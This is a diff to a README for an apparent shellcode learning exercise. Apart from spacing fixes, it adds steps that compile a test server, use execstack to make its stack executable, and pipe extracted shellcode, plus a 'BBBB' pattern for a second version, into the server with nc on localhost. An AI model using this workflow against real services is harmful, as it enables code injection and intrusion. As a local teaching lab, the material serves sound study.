@@ -19,7 +19,7 @@ To link it (that step should not be necessary) :
 
 For the test server, you should :
 
-Compile it with gcc :
+Compile it with gcc:
 
    ```
    gcc -o server serv_test.c
@@ -31,7 +31,7 @@ And then you should run execstack, wich will allow code execution on the stack. 
    apt-get install execstack
    ```
 
-And then run :
+And then run:
    
    ```
    execstack -s ./server
@@ -46,3 +46,7 @@ And to get the shellcode, I use the command line (thanks to http://www.commandli
 For testing, we will use this :
 
     (echo -ne `getsc shellcode` ; cat) | nc localhost 1024
+
+And for our shellcode V2, we will need to give him the pattern to match, so let's use this :
+
+    (echo -ne `getsc shellcode` ; echo -n BBBB ;  cat) | nc localhost 1024
